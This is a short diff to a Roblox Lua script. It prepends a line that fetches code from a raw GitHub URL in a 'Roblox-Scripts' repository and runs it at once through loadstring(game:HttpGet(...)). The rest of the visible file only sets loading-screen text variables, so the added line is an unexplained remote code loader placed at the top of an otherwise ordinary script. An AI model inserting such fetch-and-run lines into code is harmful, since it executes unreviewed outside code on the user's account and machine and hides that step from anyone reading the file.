@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ro-Xcripts/Roblox-Scripts/refs/heads/main/Ignore
+", true))()
+
 LoadingScreenValue = true
 LoadingText1 = "Loading Library"
 LoadingText2 = "Updating Library"
